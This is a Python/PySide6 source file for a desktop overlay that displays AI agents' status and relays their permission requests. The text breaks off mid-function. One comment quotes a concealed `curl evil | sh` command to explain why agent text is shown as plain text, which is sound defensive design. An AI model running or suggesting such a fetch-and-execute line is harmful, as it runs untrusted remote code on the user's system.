"""Floating Dynamic-Island overlay for Dulus Bar (Windows / macOS / Linux).

On a MacBook with a camera notch the island anchors to the notch and stays
visible across every Space and full-screen app. Everywhere else it floats at
top-center. It shows every connected AI agent, forwards Allow/Deny approvals,
and surfaces each agent's model and context usage when it reports them.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
import time
import webbrowser
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from PySide6 import QtCore, QtGui, QtWidgets
from PySide6.QtCore import Qt, QTimer, Signal
from PySide6.QtGui import QColor, QFont, QIcon
from PySide6.QtWidgets import (
    QApplication,
    QGraphicsDropShadowEffect,
    QHBoxLayout,
    QLabel,
    QMainWindow,
    QPushButton,
    QVBoxLayout,
    QWidget,
)

from . import autostart, native
from . import protocol as P
from .agents import detect_installed, style_for
from .config import Settings
from .integrations import python_console
from .protocol import AgentEvent
from .server import AgentEventServer
from .state import Permission, Session, SessionStore, call_text, one_line

APP_NAME = "Dulus Bar"
WS_PORT = P.DEFAULT_PORT
DOCS_URL = "https://github.com/Dulus-Ai/Dulus-bar#readme"

# --- palette --------------------------------------------------------------
# Elevated surfaces sit clearly above any wallpaper OR a dark terminal behind.
PILL_BG = "#1b1b21"
PILL_BG_HOVER = "#24242c"
PILL_BORDER = "#3a3a44"
PILL_BORDER_HOVER = "#50505c"
BG = "#151519"  # panel / toast surface
BG_HOVER = "#212128"
CODE_BG = "#0e0e12"
BORDER = "#2c2c34"
BORDER_HOVER = "#3a3a44"
TEXT = "#f4f4f5"
TEXT_DIM = "#b4b4bd"
TEXT_FAINT = "#7a7a84"
GOOD = "#4ade80"
WARN = "#facc15"
INFO = "#60a5fa"
BAD = "#f87171"
IDLE = "#71717a"

ROW_HEIGHT = 46
PANEL_WIDTH = 360
ROW_TEXT_PX = PANEL_WIDTH - 104  # panel/row margins, status dot, dismiss button
PILL_META_PX = 190
TOAST_WIDTH = 420

# --- notch-style auto-hide (Qt overlay: Windows / Linux) ------------------
# Mirrors the macOS notch surface: the island rests as a slim "peek" tab flush
# with the top edge and reveals on hover over the top-center zone, when an
# agent finishes or fails (briefly), or on a permission request (staying open
# until answered). Turn it off from the menu, or with DULUS_BAR_NO_AUTOHIDE=1.
PEEK_WIDTH = 132
PEEK_HEIGHT = 6
HOT_ZONE_HEIGHT = 10   # px below the top edge that counts as "hovering the notch"
HOT_ZONE_PAD = 16      # px of horizontal slack on each side of the island
HOVER_DWELL_MS = 350   # ms of intentional hover required before expanding
BRIEF_REVEAL_MS = 2600  # how long a finished / failed agent peeks the island open
TOP_MARGIN = 8         # gap between the screen/work-area top and the pill
NOTIFY_COOLDOWN_S = 8.0  # per session, so a chatty agent can't spam the desktop

STATUS_COLORS = {
    "running": GOOD,
    "waiting": WARN,
    "done": INFO,
    "error": BAD,
    "idle": IDLE,
}

# Native default font family; replaced at runtime by native.default_font_family().
FONT_FAMILY = "Segoe UI"
MONO_FAMILY = "monospace"

_TRUTHY = ("1", "true", "True", "yes")


def _ctx_color(ctx: str) -> str:
    """Green/amber/red for a percentage ("38%"); neutral for token counts."""
    if "%" not in ctx:
        return TEXT_DIM
    digits = ""
    for ch in ctx:
        if ch.isdigit():
            digits += ch
        elif digits:
            break
    if not digits:
        return TEXT_DIM
    pct = int(digits)
    if pct >= 85:
        return BAD
    if pct >= 60:
        return WARN
    return GOOD


def _esc(text: str) -> str:
    """Minimal HTML escape for RichText labels."""
    return (text or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _elide(text: str, limit: int = 88) -> str:
    """One clean, truncated line — a long minified tool call never wraps."""
    return one_line(text, limit)


def _ago(seconds: float) -> str:
    seconds = max(0, int(seconds))
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds // 60}m"
    return f"{seconds // 3600}h"


def _meta_plain(session: Session) -> str:
    return " · ".join(x for x in (session.model, f"ctx {session.ctx}" if session.ctx else "") if x)


def _meta_html(session: Session, accent: str) -> str:
    """``model · ctx`` for agents that report them (Dulus, Claude Code…)."""
    bits = []
    if session.model:
        bits.append(f"<span style='color:{accent};'>{_esc(session.model)}</span>")
    if session.ctx:
        bits.append(f"<span style='color:{_ctx_color(session.ctx)};'>ctx {_esc(session.ctx)}</span>")
    return " · ".join(bits)


def _fit(text: str, font: QFont, pixels: int) -> str:
    """Elide ``text`` to what really fits in ``pixels`` with ``font``."""
    flat = " ".join((text or "").split())
    return QtGui.QFontMetrics(font).elidedText(flat, Qt.TextElideMode.ElideRight, max(24, pixels))


class PillButton(QPushButton):
    """Rounded Allow/Deny button. `fg`/`border` let a button read as a light
    primary (white fill, dark text) or a dark secondary (subtle fill, light
    text, hairline border) — the same hierarchy as the macOS approval surface."""

    def __init__(
        self,
        text: str,
        color: str,
        parent: Optional[QWidget] = None,
        fg: str = "#08080a",
        border: str = "",
    ):
        super().__init__(text, parent)
        self.setFixedHeight(28)
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        edge = f"1px solid {border}" if border else "none"
        self.setStyleSheet(
            f"""
            QPushButton {{
                background-color: {color};
                color: {fg};
                border: {edge};
                border-radius: 14px;
                padding: 0 18px;
                font-family: "{FONT_FAMILY}";
                font-weight: 700;
                font-size: 11px;
            }}
            QPushButton:hover {{ background-color: {color}; padding: 0 19px; }}
            QPushButton:pressed {{ background-color: {color}; }}
            """
        )


class StatusDot(QWidget):
    """Status dot; live states send out a soft ripple, like a heartbeat.

    ~30 fps from a plain timer, only while visible, and only for the states
    in ``pulse_for``: the pill sits under a blurred shadow that every repaint
    re-renders, so it pulses just while something waits for you.
    """

    FRAME_MS = 33

    def __init__(self, parent: Optional[QWidget] = None, size: int = 12,
                 pulse_for: Tuple[str, ...] = ("running", "waiting")):
        super().__init__(parent)
        self.setFixedSize(size, size)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, True)
        self._pulse_for = pulse_for
        self._color = QColor(IDLE)
        self._status = ""
        self._phase = 0.0
        self._period = 1.8
        self._timer = QTimer(self)
        self._timer.setInterval(self.FRAME_MS)
        self._timer.timeout.connect(self._tick)

    @property
    def _live(self) -> bool:
        return self._status in self._pulse_for

    def set_status(self, status: str) -> None:
        if status == self._status:
            return
        self._status = status
        self._color = QColor(STATUS_COLORS.get(status, IDLE))
        self._period = 1.0 if status == "waiting" else 1.8
        if self._live and self.isVisible():
            self._timer.start()
        elif not self._live:
            self._timer.stop()
            self._phase = 0.0
        self.update()

    def showEvent(self, event: QtGui.QShowEvent) -> None:
        super().showEvent(event)
        if self._live:
            self._timer.start()

    def hideEvent(self, event: QtGui.QHideEvent) -> None:
        super().hideEvent(event)
        self._timer.stop()  # no ticking while nobody can see it

    def _tick(self) -> None:
        t = (time.monotonic() % self._period) / self._period
        self._phase = 1.0 - (1.0 - t) ** 3  # ease-out: a quick burst that settles
        self.update()

    def paintEvent(self, event: QtGui.QPaintEvent) -> None:
        painter = QtGui.QPainter(self)
        painter.setRenderHint(QtGui.QPainter.RenderHint.Antialiasing)
        painter.setPen(Qt.PenStyle.NoPen)
        center = QtCore.QPointF(self.width() / 2, self.height() / 2)
        core = min(self.width(), self.height()) * 0.29
        if self._live:
            ring = QColor(self._color)
            ring.setAlphaF(0.55 * (1.0 - self._phase))
            painter.setBrush(ring)
            radius = core + (min(self.width(), self.height()) / 2 - core) * self._phase
            painter.drawEllipse(center, radius, radius)
        painter.setBrush(self._color)
        painter.drawEllipse(center, core, core)


class SessionRow(QWidget):
    """One agent row inside the expanded panel, updated in place."""

    clicked = Signal(object)    # Session
    dismissed = Signal(object)  # Session

    def __init__(self, session: Session, parent: Optional[QWidget] = None):
        super().__init__(parent)
        self.session = session
        self.style_ = style_for(session.agent)
        self.setAttribute(Qt.WidgetAttribute.WA_StyledBackground, True)
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        self.setFixedHeight(ROW_HEIGHT)
        self.setObjectName("row")
        self.setStyleSheet(
            "#row { background: transparent; border-radius: 10px; }"
            f"#row:hover {{ background: {BG_HOVER}; }}"
        )

        root = QHBoxLayout(self)
        root.setContentsMargins(10, 4, 8, 4)
        root.setSpacing(10)

        self.dot = StatusDot(self)
        root.addWidget(self.dot, 0, Qt.AlignmentFlag.AlignVCenter)

        text_col = QVBoxLayout()
        text_col.setSpacing(1)
        text_col.setContentsMargins(0, 0, 0, 0)

        top = QHBoxLayout()
        top.setSpacing(6)
        top.setContentsMargins(0, 0, 0, 0)
        self.icon = QLabel(self.style_.emoji)
        self.icon.setFont(QFont(FONT_FAMILY, 11))
        top.addWidget(self.icon)
        self.name = QLabel()
        self.name.setFont(QFont(FONT_FAMILY, 11, QFont.Weight.DemiBold))
        self.name.setTextFormat(Qt.TextFormat.RichText)
        self.name.setStyleSheet(f"color: {TEXT};")
        top.addWidget(self.name)
        top.addStretch()
        self.time = QLabel()
        self.time.setFont(QFont(FONT_FAMILY, 9))
        self.time.setStyleSheet(f"color: {TEXT_FAINT};")
        top.addWidget(self.time)
        text_col.addLayout(top)

        self.sub = QLabel()
        self.sub.setFont(QFont(FONT_FAMILY, 9))
        self.sub.setStyleSheet(f"color: {TEXT_DIM};")
        self.sub.setTextFormat(Qt.TextFormat.RichText)
        text_col.addWidget(self.sub)
        root.addLayout(text_col, 1)

        self.close_btn = QPushButton("×", self)
        self.close_btn.setFixedSize(18, 18)
        self.close_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.close_btn.setToolTip("Dismiss")
        self.close_btn.setStyleSheet(
            f"QPushButton {{ color: {TEXT_FAINT}; background: transparent; border: none;"
            f" font-size: 14px; border-radius: 9px; }}"
            f"QPushButton:hover {{ color: {TEXT}; background: {BORDER}; }}"
        )
        self.close_btn.clicked.connect(lambda: self.dismissed.emit(self.session))
        self.close_btn.setVisible(False)
        root.addWidget(self.close_btn, 0, Qt.AlignmentFlag.AlignVCenter)

        self.update_session(session)

    def update_session(self, session: Session) -> None:
        self.session = session
        self.dot.set_status(session.status)
        self.time.setText(_ago(time.time() - session.status_since))
        name_font = self.name.font()
        room = ROW_TEXT_PX - 36 - QtGui.QFontMetrics(name_font).horizontalAdvance(self.style_.display + "  ")
        title = ""
        if session.title and room > 30:
            faint = QFont(name_font)
            faint.setWeight(QFont.Weight.Normal)
            title = (f"&nbsp;<span style='color:{TEXT_FAINT}; font-weight:400;'>"
                     f"{_esc(_fit(session.title, faint, room))}</span>")
        self.name.setText(f"{_esc(self.style_.display)}{title}")
        self.sub.setText(self._subtitle(session))

    def _subtitle(self, session: Session) -> str:
        font = self.sub.font()
        plain = _meta_plain(session)
        room = ROW_TEXT_PX - (QtGui.QFontMetrics(font).horizontalAdvance(plain + " · ") if plain else 0)
        msg = _esc(_fit(session.message or session.status, font, room))
        meta = _meta_html(session, self.style_.accent)
        if meta:
            return f"{meta} · <span style='color:{TEXT_FAINT};'>{msg}</span>" if msg else meta
        return f"<span style='color:{TEXT_DIM};'>{msg}</span>"

    def enterEvent(self, event: QtCore.QEvent) -> None:
        # Live sessions can't be dismissed — they'd just come right back.
        self.close_btn.setVisible(self.session.status not in ("running", "waiting"))

    def leaveEvent(self, event: QtCore.QEvent) -> None:
        self.close_btn.setVisible(False)

    def mousePressEvent(self, a0: Optional[QtGui.QMouseEvent]) -> None:
        self.clicked.emit(self.session)


class IslandPill(QWidget):
    """Collapsed island pill that toggles the expanded panel."""

    toggled = Signal()
    rightClicked = Signal()

    def __init__(self, parent: Optional[QWidget] = None):
        super().__init__(parent)
        # QWidget *subclasses* need WA_StyledBackground for a stylesheet
        # background to actually paint (a plain QWidget does it automatically).
        self.setAttribute(Qt.WidgetAttribute.WA_StyledBackground, True)
        self.setFixedHeight(42)
        self.setMinimumWidth(160)
        self.setObjectName("pill")
        self._hovered = False
        self._apply_style()
        self.setCursor(Qt.CursorShape.PointingHandCursor)

    def _apply_style(self) -> None:
        bg = PILL_BG_HOVER if self._hovered else PILL_BG
        border = PILL_BORDER_HOVER if self._hovered else PILL_BORDER
        self.setStyleSheet(
            f"#pill {{ background-color: {bg}; border: 1px solid {border}; border-radius: 21px; }}"
        )

    def enterEvent(self, event: Optional[QtCore.QEvent]) -> None:
        self._hovered = True
        self._apply_style()

    def leaveEvent(self, a0: Optional[QtCore.QEvent]) -> None:
        self._hovered = False
        self._apply_style()

    def mousePressEvent(self, a0: Optional[QtGui.QMouseEvent]) -> None:
        if a0 is not None and a0.button() == Qt.MouseButton.RightButton:
            self.rightClicked.emit()
        else:
            self.toggled.emit()


class DulusBarOverlay(QMainWindow):
    """Top-center / notch-anchored floating island."""

    event_received = Signal(AgentEvent)
    shutdown_requested = Signal()

    def __init__(self, server: AgentEventServer, settings: Optional[Settings] = None):
        super().__init__()
        self.server = server
        self.settings = settings or Settings()
        self.store = SessionStore()
        self.tray: Optional["TrayApp"] = None
        self.server.on_event(self._on_agent_event)
        self.server.on_shutdown(self.shutdown_requested.emit)
        self.event_received.connect(self._handle_event, Qt.ConnectionType.QueuedConnection)  # type: ignore[call-arg]
        self.shutdown_requested.connect(self.quit_app, Qt.ConnectionType.QueuedConnection)  # type: ignore[call-arg]

        self._quitting = False
        self.expanded = False
        self.toast_visible = False
        self.current_permission: Optional[Permission] = None
        self._configured_native = False
        self._rows: Dict[Tuple[str, str], SessionRow] = {}
        self._last_notified: Dict[Tuple[str, str], float] = {}

        # Notch-style auto-hide. On by default (Windows/Linux Qt overlay); the
        # native macOS surface handles its own notch behaviour separately.
        self._autohide_forced_off = os.environ.get("DULUS_BAR_NO_AUTOHIDE") in _TRUTHY
        if not QtWidgets.QSystemTrayIcon.isSystemTrayAvailable():
            # No status area (plain GNOME, bare WMs…): the tray menu is not a way
            # back, so tucking the island out of sight could strand the user.
            self._autohide_forced_off = True
        self._autohide = bool(self.settings["autohide"]) and not self._autohide_forced_off
        self.revealed = not self._autohide  # tucked to a peek until hovered
        self.permission_pinned = False      # stay revealed while a prompt is open
        self._reveal_until = 0.0            # monotonic deadline for a brief peek
        self._expand_grace = 0.0            # keep the panel open briefly after a manual expand
        self._hover_entered_at = 0.0        # monotonic timestamp when cursor entered hot zone

        # Placement policy comes from the platform backend: Linux anchors inside
        # the work area (panels/docks) and needs the position re-asserted after
        # the window manager has had its say.
        self._use_available_geometry = native.overlay_use_available_geometry()
        self._settle_delays = native.overlay_settle_delays_ms()
        self._size: Optional[tuple] = None
        # Escape hatch for window managers without a compositor (bare i3/openbox
        # with no picom): a translucent window there paints solid black around
        # the pill, so DULUS_BAR_OPAQUE=1 drops translucency and the shadows.
        self._opaque = os.environ.get("DULUS_BAR_OPAQUE") in _TRUTHY

        self._init_window()
        self._init_ui()
        self._reposition()
        self._init_refresh_timer()
        self._init_hover_timer()
        self._watch_screens()
        self._apply_geometry()  # start tucked (or correctly sized when always-on)

    # --- setup ----------------------------------------------------------
    def _overlay_flags(self) -> Qt.WindowType:
        flags = (
            Qt.WindowType.FramelessWindowHint
            | Qt.WindowType.WindowStaysOnTopHint
            | Qt.WindowType.Tool
            | Qt.WindowType.NoDropShadowWindowHint
        )
        # Platform extras by name (e.g. X11BypassWindowManagerHint on Linux),
        # ignoring anything this Qt build doesn't know about.
        for name in native.overlay_extra_window_flags():
            extra = getattr(Qt.WindowType, name, None)
            if extra is not None:
                flags |= extra
        return flags

    def _init_window(self) -> None:
        self.setWindowTitle(APP_NAME)
        self.setWindowFlags(self._overlay_flags())
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, not self._opaque)
        self.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents, False)
        self.setAttribute(Qt.WidgetAttribute.WA_ShowWithoutActivating, True)  # never steal focus
        self.setFixedHeight(58)

    def _init_ui(self) -> None:
        central = QWidget()
        central.setStyleSheet("background: transparent;" if not self._opaque else f"background: {BG};")
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # --- collapsed pill ---
        self.pill = IslandPill()
        self.pill.toggled.connect(self._toggle_expand)
        self.pill.rightClicked.connect(self._show_context_menu)
        pill_row = QHBoxLayout(self.pill)
        pill_row.setContentsMargins(16, 0, 16, 0)
        pill_row.setSpacing(8)

        self.icon_label = QLabel()
        self.icon_label.setFont(QFont(FONT_FAMILY, 12))
        # A fixed, centred box: colour-emoji glyphs carry odd metrics and used
        # to sit high and clip against the pill's edge.
        self.icon_label.setFixedSize(22, 22)
        self.icon_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self._bird_pixmap = self._load_bird_pixmap(20)
        self._apply_pill_icon(None)  # brand bird by default
        pill_row.addWidget(self.icon_label)

        self.pill_dot = StatusDot(self.pill, size=10, pulse_for=("waiting",))
        self.pill_dot.setVisible(False)
        pill_row.addWidget(self.pill_dot)

        self.status_label = QLabel(APP_NAME)
        self.status_label.setTextFormat(Qt.TextFormat.PlainText)  # agent names are untrusted
        self.status_label.setFont(QFont(FONT_FAMILY, 11, QFont.Weight.DemiBold))
        self.status_label.setStyleSheet(f"color: {TEXT};")
        pill_row.addWidget(self.status_label)

        self.meta_label = QLabel("")  # model / ctx, or a short status
        self.meta_label.setFont(QFont(FONT_FAMILY, 9))
        self.meta_label.setTextFormat(Qt.TextFormat.RichText)
        self.meta_label.setStyleSheet(f"color: {TEXT_DIM};")
        pill_row.addWidget(self.meta_label)

        pill_row.addStretch()

        self.count_badge = QLabel("")
        self.count_badge.setFont(QFont(FONT_FAMILY, 9, QFont.Weight.Bold))
        self.count_badge.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.count_badge.setFixedSize(20, 20)
        self._style_badge(GOOD)
        self.count_badge.setVisible(False)
        pill_row.addWidget(self.count_badge)

        # --- expanded panel ---
        self.panel = QWidget()
        self.panel.setObjectName("panel")
        self.panel.setStyleSheet(
            f"#panel {{ background-color: {BG}; border: 1px solid {BORDER}; border-radius: 18px; }}"
        )
        self.panel.setFixedWidth(PANEL_WIDTH - 20)
        self.panel.setVisible(False)
        self.panel_layout = QVBoxLayout(self.panel)
        self.panel_layout.setContentsMargins(12, 12, 12, 12)
        self.panel_layout.setSpacing(4)

        header_row = QHBoxLayout()
        header_row.setContentsMargins(0, 0, 0, 0)
        header = QLabel("ACTIVE AGENTS")
        header.setFont(QFont(FONT_FAMILY, 8, QFont.Weight.Bold))
        header.setStyleSheet(f"color: {TEXT_FAINT}; letter-spacing: 1.5px;")
        header_row.addWidget(header)
        header_row.addStretch()
        self.clear_btn = QPushButton("Clear finished")
        self.clear_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.clear_btn.setFont(QFont(FONT_FAMILY, 8, QFont.Weight.DemiBold))
        self.clear_btn.setStyleSheet(
            f"QPushButton {{ color: {TEXT_FAINT}; background: transparent; border: none; padding: 0; }}"
            f"QPushButton:hover {{ color: {TEXT}; }}"
        )
        self.clear_btn.clicked.connect(self._clear_finished)
        self.clear_btn.setVisible(False)
        header_row.addWidget(self.clear_btn)
        self.panel_layout.addLayout(header_row)

        self.empty_label = QLabel()
        self.empty_label.setFont(QFont(FONT_FAMILY, 10))
        self.empty_label.setWordWrap(True)
        self.empty_label.setTextFormat(Qt.TextFormat.RichText)
        self.empty_label.setStyleSheet(f"color: {TEXT_FAINT}; padding: 8px 4px;")
        self.panel_layout.addWidget(self.empty_label)

        self.sessions_container = QVBoxLayout()
        self.sessions_container.setSpacing(2)
        self.sessions_container.setContentsMargins(0, 0, 0, 0)
        self.panel_layout.addLayout(self.sessions_container)
        self.panel_layout.addStretch()

        # --- collapsed "peek" tab (notch rest state) ---
        # A slim bar flush with the top edge. When tucked this is all that shows;
        # hovering the top-center zone reveals the full pill.
        self.peek = QWidget()
        self.peek.setObjectName("peek")
        self.peek.setFixedSize(PEEK_WIDTH, PEEK_HEIGHT)
        self.peek.setVisible(False)
        self._style_peek(PILL_BORDER)

        # --- permission toast ---
        self._build_toast()

        # assemble
        container = QWidget()
        col = QVBoxLayout(container)
        col.setContentsMargins(0, 0, 0, 0)
        col.setSpacing(8)
        col.setAlignment(Qt.AlignmentFlag.AlignHCenter)
        col.addWidget(self.peek, alignment=Qt.AlignmentFlag.AlignHCenter)
        col.addWidget(self.pill, alignment=Qt.AlignmentFlag.AlignHCenter)
        col.addWidget(self.panel, alignment=Qt.AlignmentFlag.AlignHCenter)
        layout.addWidget(container)

        shadow = QGraphicsDropShadowEffect(self.pill)
        shadow.setBlurRadius(34)
        shadow.setColor(QColor(0, 0, 0, 210))
        shadow.setOffset(0, 8)
        if not self._opaque:
            self.pill.setGraphicsEffect(shadow)

    def _style_badge(self, color: str) -> None:
        if color == getattr(self, "_badge_color", None):
            return
        self._badge_color = color
        self.count_badge.setStyleSheet(f"color: #08080a; background: {color}; border-radius: 10px;")

    def _build_toast(self) -> None:
        # Top-level window, NOT a child of the island. A child is clipped to the
        # tiny island window and never shows — which is why Allow/Deny was
        # invisible. As its own frameless, always-on-top window the permission
        # prompt floats below the pill anywhere on screen.
        self.toast = QWidget(None)
        self.toast.setWindowFlags(self._overlay_flags())
        # The WINDOW is translucent ONLY so the corners round off and the shadow
        # can bleed. The solid bubble is an inner "card" child — a translucent
        # top-level's OWN stylesheet fill is unreliable (Qt skips it, leaving the
        # text floating on whatever's behind → invisible on a light/white
        # desktop). A normal child widget with WA_StyledBackground ALWAYS paints
        # its background — the same approach the expanded panel uses.
        self.toast.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, not self._opaque)
        self.toast.setAttribute(Qt.WidgetAttribute.WA_ShowWithoutActivating, True)
        self.toast.setFixedWidth(TOAST_WIDTH)
        self.toast.setVisible(False)

        outer = QVBoxLayout(self.toast)
        outer.setContentsMargins(14, 8, 14, 16)  # breathing room for the shadow

        card = QWidget(self.toast)
        card.setObjectName("toastcard")
        card.setAttribute(Qt.WidgetAttribute.WA_StyledBackground, True)
        card.setStyleSheet(
            f"#toastcard {{ background-color: {PILL_BG}; border: 1px solid {PILL_BORDER};"
            f" border-radius: 18px; }}"
        )
        outer.addWidget(card)
        self.toast_card = card

        t = QVBoxLayout(card)
        t.setContentsMargins(16, 12, 16, 12)
        t.setSpacing(6)

        head = QHBoxLayout()
        head.setSpacing(8)
        self.toast_title = QLabel("Permission request")
        self.toast_title.setFont(QFont(FONT_FAMILY, 11))
        self.toast_title.setTextFormat(Qt.TextFormat.RichText)
        self.toast_title.setStyleSheet(f"color: {TEXT}; background: transparent;")
        head.addWidget(self.toast_title, 1)
        self.toast_counter = QLabel("")
        self.toast_counter.setFont(QFont(FONT_FAMILY, 8, QFont.Weight.Bold))
        self.toast_counter.setStyleSheet(
            f"color: #08080a; background: {WARN}; border-radius: 8px; padding: 1px 7px;"
        )
        self.toast_counter.setVisible(False)
        head.addWidget(self.toast_counter, 0, Qt.AlignmentFlag.AlignTop)
        t.addLayout(head)

        # Agent-supplied text is PLAIN text, always. As rich text, a command
        # like `true <font color=…>; curl evil | sh;</font> ls` would *show* as
        # `true ; ls` — and get approved.
        self.toast_body = QLabel("")
        self.toast_body.setTextFormat(Qt.TextFormat.PlainText)
        self.toast_body.setFont(QFont(FONT_FAMILY, 10, QFont.Weight.DemiBold))
        self.toast_body.setStyleSheet(f"color: {TEXT_DIM}; background: transparent;")
        self.toast_body.setWordWrap(True)
        t.addWidget(self.toast_body)

        self.toast_code = QLabel("")
        self.toast_code.setTextFormat(Qt.TextFormat.PlainText)
        self.toast_code.setFont(QFont(MONO_FAMILY, 9))
        self.toast_code.setWordWrap(False)  # hard-wrapped ourselves: see _wrap_code
        self.toast_code.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        self.toast_code.setStyleSheet(
            f"color: {TEXT}; background: {CODE_BG}; border: 1px solid {BORDER};"
            f" border-radius: 9px; padding: 7px 9px;"
        )
        t.addWidget(self.toast_code)

        btns = QHBoxLayout()
        btns.setSpacing(8)
        btns.addStretch()
        # macOS-style hierarchy: Allow is the light primary, Deny the dark
        # secondary — calmer and clearer than the old red/green pair.
        self.deny_btn = PillButton("Deny", "#2b2b33", fg=TEXT, border=BORDER_HOVER)
        self.always_btn = PillButton("Always allow", "#2b2b33", fg=TEXT, border=BORDER_HOVER)
        self.allow_btn = PillButton("Allow", "#f5f5f6", fg="#08080a")
        btns.addWidget(self.deny_btn)
        btns.addWidget(self.always_btn)
        btns.addWidget(self.allow_btn)
        t.addLayout(btns)

        self.deny_btn.clicked.connect(lambda: self._resolve_permission(False))
        self.always_btn.clicked.connect(lambda: self._resolve_permission(True, always=True))
        self.allow_btn.clicked.connect(lambda: self._resolve_permission(True))
        # Deliberately mouse-only, and never activated on show: a card that
        # grabbed focus could turn the Enter you were typing into an "Allow".

        toast_shadow = QGraphicsDropShadowEffect(card)
        toast_shadow.setBlurRadius(24)
        toast_shadow.setColor(QColor(0, 0, 0, 200))
        toast_shadow.setOffset(0, 6)
        if not self._opaque:
            card.setGraphicsEffect(toast_shadow)

    def _init_refresh_timer(self) -> None:
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._refresh_ui)
        self.timer.start(1000)

    def _watch_screens(self) -> None:
        """Follow monitor changes: plug/unplug, resolution, panel moves."""
        app = QApplication.instance()
        if isinstance(app, QtGui.QGuiApplication):
            app.primaryScreenChanged.connect(lambda _screen: self._on_screen_changed())
            app.screenAdded.connect(lambda _screen: self._on_screen_changed())
            app.screenRemoved.connect(lambda _screen: self._on_screen_changed())
        screen = QApplication.primaryScreen()
        if screen is not None:
            screen.geometryChanged.connect(lambda _rect: self._on_screen_changed())
            screen.availableGeometryChanged.connect(lambda _rect: self._on_screen_changed())

    def _on_screen_changed(self) -> None:
        self._reposition()
        self._settle_position()
        self._position_toast()

    # --- positioning (notch-aware) --------------------------------------
    def _screen_rect(self) -> QtCore.QRect:
        """Rect the island anchors to: the work area where the platform asks
        for it (Linux panels/docks), the raw screen otherwise."""
        screen = QApplication.primaryScreen()
        if screen is None:
            return QtCore.QRect(0, 0, 1920, 1080)
        return screen.availableGeometry() if self._use_available_geometry else screen.geometry()

    def _reposition(self) -> None:
        rect = self._screen_rect()
        width = self.width()
        x = rect.x() + (rect.width() - width) // 2

        if self._autohide and not self.revealed:
            # Tucked: peek sits flush against the very top edge, like a notch nub.
            y = rect.y()
        else:
            notch = native.notch_geometry()
            if notch is not None:
                # Qt fallback: hang directly under the camera cutout. The native
                # Swift/AppKit surface is preferred on macOS for true integration.
                y = rect.y() + max(0, notch.height - 4)
            else:
                y = rect.y() + TOP_MARGIN
        # Only move when we're actually off target: the refresh timer calls this
        # every second, and re-issuing the same move made X11 flicker. Comparing
        # against the live position also means a WM that re-placed the window
        # gets corrected on the very next tick.
        if (self.x(), self.y()) != (x, y):
            self.move(x, y)

    def _settle_position(self) -> None:
        """Re-assert the position while the WM finishes mapping/resizing us.

        Linux/X11 window managers (GNOME/KDE/…) apply their own placement policy
        to a frameless Tool window and silently ignore the pre-map move(),
        dropping the island in the screen centre instead of the top edge — and
        some of them do it a few hundred ms late. Harmless on Windows/macOS.
        """
        for delay in self._settle_delays:
            QTimer.singleShot(delay, self._reposition)

    def showEvent(self, a0) -> None:  # noqa: ANN001
        super().showEvent(a0)
        # macOS: promote to an always-visible, all-Spaces window once shown.
        if not self._configured_native:
            self._configured_native = True
            try:
                native.configure_always_visible(self)
            except Exception:
                pass
            # Debug aid: auto-expand for screenshots (DULUS_BAR_AUTO_EXPAND=1).
            if os.environ.get("DULUS_BAR_AUTO_EXPAND") and not self.expanded:
                QTimer.singleShot(900, self._toggle_expand)
        self._reposition()
        self._settle_position()

    # --- server plumbing ------------------------------------------------
    def _on_agent_event(self, event: AgentEvent) -> None:
        # Hub thread -> Qt thread.
        self.event_received.emit(event)

    def _handle_event(self, event: AgentEvent) -> None:
        key = (event.agent, event.session_id)
        before = self.store.sessions.get(key)
        old_status = before.status if before else None
        self.store.apply(event)
        session = self.store.sessions.get(key)

        if event.event_type == P.TOOL_REQUEST:
            perm = self.store.find_permission(event.request_id) if event.request_id else None
            if perm is not None:
                self._notify_permission(perm)
            # A permission request forces the island fully open and pins it
            # there until it's answered — same as the macOS notch surface.
            self._reveal(pin=True)
        elif session is not None and session.status != old_status:
            # Peek open when something *changes* — a finished or failed agent —
            # not on every tool call (agents with hooks report dozens a minute).
            if session.status in ("done", "error") or event.event_type == P.SESSION_STARTED:
                if self.settings["reveal_on_activity"] and not self.settings["do_not_disturb"]:
                    self._reveal(brief=True)
                if session.status in ("done", "error"):
                    self._notify_finished(session)
        self._sync_permission_card()
        self._refresh_ui()

    # --- permissions ----------------------------------------------------
    def _sync_permission_card(self) -> None:
        """Show the head of the request queue, or hide the card."""
        perm = self.store.current_permission()
        if perm is None:
            if self.toast_visible:
                self.toast.setVisible(False)
            self.toast_visible = False
            self.current_permission = None
            self.permission_pinned = False  # free the island to tuck again
            return
        self.permission_pinned = True
        if (
            self.current_permission is not None
            and perm.request_id == self.current_permission.request_id
            and self.toast_visible
        ):
            self._update_counter()
            return
        self.current_permission = perm
        self._render_permission(perm)

    def _update_counter(self) -> None:
        total = len(self.store.permissions)
        self.toast_counter.setText(f"1 of {total}")
        self.toast_counter.setVisible(total > 1)

    def _render_permission(self, perm: Permission) -> None:
        st = style_for(perm.agent)
        sess = self.store.sessions.get(perm.key)
        # Title mirrors the macOS surface: agent name + project / model, falling
        # back to a faint "needs approval" when neither is known yet.
        tags = [t for t in ((sess.title if sess else ""), (sess.model if sess else "")) if t]
        tag = _esc(" · ".join(tags)) if tags else "needs approval"
        self.toast_title.setText(
            f"{st.emoji}&nbsp; <b>{_esc(st.display)}</b>"
            f"&nbsp;&nbsp;<span style='color:{TEXT_FAINT};'>{tag}</span>"
        )
        # Wrapper requests carry raw terminal text as the "tool", hooks a clean
        # tool name plus a detail block (the full command, a diff excerpt…).
        detail = perm.detail.strip() or perm.args.strip()
        if detail:
